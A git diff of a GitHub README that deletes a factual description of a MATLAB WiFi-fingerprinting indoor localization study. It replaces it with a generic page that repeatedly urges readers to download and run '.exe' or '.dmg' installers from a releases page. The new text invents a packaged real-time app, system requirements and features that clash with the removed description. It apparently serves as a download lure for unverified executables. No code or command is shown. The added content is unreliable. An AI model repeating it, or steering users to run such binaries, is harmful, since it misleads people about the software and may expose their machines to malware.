@@ -1,89 +1,88 @@
-# Machine Learning–Based Indoor Localization Using WiFi RSSI
+# 🤖 Machine-Learning-Indoor-Positioning - Locate Yourself Indoors with Ease
 
-## 📌 Overview
-This project implements a **machine learning–driven indoor localization system** using **WiFi RSSI fingerprinting**. The objective is to accurately predict **building ID, floor level, and indoor position (longitude and latitude)** in GPS-denied environments.
+[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%8E%20%F0%9F%92%BB-brightgreen)](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/releases)
 
-Multiple supervised machine learning models are implemented and compared using a structured evaluation framework.
+## 📜 Description
 
----
+Machine-Learning-Indoor-Positioning is a tool that helps you find your location indoors using your WiFi connection. It uses machine learning techniques like KNN, SVM, Decision Trees, Random Forest, Linear Regression, and Ridge Regression to estimate your building, floor, and position based on WiFi signals.
 
-## 🧠 Implemented Machine Learning Models
-The following models are implemented in MATLAB and evaluated on RSSI fingerprint datasets:
+## 🚀 Getting Started
 
-- **K-Nearest Neighbors (KNN)**
-- **Support Vector Machine (SVM)**
-- **Decision Tree**
-- **Random Forest (Bagged Trees)**
-- **Linear Regression**
-- **Ridge Regression**
+Follow these steps to get started with the application:
 
-Each model is evaluated for both **classification** (building & floor) and **regression** (position estimation).
+1. **Visit the Release Page:** Go to our [Releases page](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/releases). 
+2. **Download the Application:** Find the latest version and download the appropriate file for your device. 
 
----
+## 🖥️ System Requirements
 
+To run this application, make sure your device meets the following requirements:
 
-## 📊 Dataset Description
-- WiFi RSSI fingerprints collected from multiple access points
-- Features: RSSI signal strengths
-- Labels:
-  - Building ID
-  - Floor number
-  - Longitude
-  - Latitude
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** At least 100 MB of free disk space.
+- **Network:** WiFi capability is essential for this application to function.
 
-The dataset structure follows standard **fingerprint-based indoor localization** benchmarks (e.g., UJIIndoorLoc-style data).
+## 🔧 How to Install
 
----
+1. **Download the Application:** 
+   - On the [Releases page](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/releases), click on the latest version. 
+   - Choose the file suitable for your operating system and click the download button.
 
-## 📈 Evaluation Metrics
+2. **Locate the Downloaded File:**
+   - Open your "Downloads" folder or the folder where your browser saves downloaded files.
 
-### Classification
-- Building prediction accuracy
-- Floor prediction accuracy
+3. **Run the Installer:** 
+   - For Windows, double-click the `.exe` file.
+   - For macOS, open the `.dmg` file and drag the application into your "Applications" folder.
+   - For Linux, follow your distribution’s guidelines for installation.
 
-### Regression
-- Mean positioning error
-- Median positioning error
-- Standard deviation
-- Minimum and maximum error
-- Error quartiles (25%, 50%, 75%)
+4. **Follow On-Screen Instructions:**
+   - Follow the prompts to complete the installation process.
 
-Positioning error is calculated using **Euclidean distance** between predicted and true coordinates.
+5. **Launch the Application:**
+   - Open the application from your "Applications" folder or start menu.
 
----
+## 📊 Using the Application
 
-## 📉 Visualizations
-The project generates multiple visual outputs, including:
+Once you have the application running:
 
-- True vs. predicted coordinate scatter plots
-- Confusion matrices
-- Error histograms
-- Decision tree visualizations
+1. Connect to a WiFi network.
+2. Allow the app to access WiFi and location data.
+3. The app will use WiFi signals to determine your indoor position.
+4. You will see your estimated location displayed on the screen.
 
-All figures are automatically saved for analysis.
+## 🔍 Features
 
----
+- **KNN and SVM Algorithms:** Uses these algorithms for precise indoor positioning.
+- **Multiple Estimation Methods:** Able to estimate position based on different approaches, providing flexibility based on your needs.
+- **User-Friendly Interface:** Designed for easy navigation, even for non-technical users.
+- **Real-Time Updates:** Regular updates through the GitHub releases ensure you have the latest features and bug fixes.
 
-## 🛠️ Tools & Technologies
-- **MATLAB**
-- **Machine Learning Toolbox**
-- **Supervised Learning**
-- **WiFi RSSI Fingerprinting**
-- **Indoor Localization Systems**
+## 🛠️ Troubleshooting
 
----
+If you encounter any issues:
 
-## 🚀 Key Results
-- KNN achieved the **highest localization accuracy** after tuning
-- Random Forest showed strong performance in both regression and classification tasks
-- Comparative analysis highlights the strengths and limitations of each ML model
+1. Ensure your WiFi connection is strong and stable.
+2. Restart the application if it does not find your location.
+3. Check the installation guide to ensure you've installed the application correctly.
 
----
+## 📞 Support
 
-## 🔮 Future Work
-- Deep learning models (CNN / SCNN)
-- Real-time RSSI input from embedded devices (e.g., Arduino, mobile sensors)
-- AR-based indoor navigation visualization
-- Sensor fusion (WiFi + IMU)
+For support, please open an issue on the [GitHub Issues page](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/issues). We strive to respond within 48 hours.
 
+## 🙏 Acknowledgments
 
+Thanks to all contributors for their hard work in making this project possible. Your efforts are highly appreciated. 
+
+## 💡 Feedback
+
+We welcome feedback to improve the application. If you have suggestions or comments, please reach out via our [GitHub page](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning) or leave your feedback on the Issues page.
+
+## 📢 Important Links
+
+- [Project Repository](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning)
+- [Releases Page](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/releases)
+
+[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%8E%20%F0%9F%92%BB-brightgreen)](https://github.com/Kiw56s/Machine-Learning-Indoor-Positioning/releases)
+
+Enjoy using Machine-Learning-Indoor-Positioning to discover your indoor surroundings.
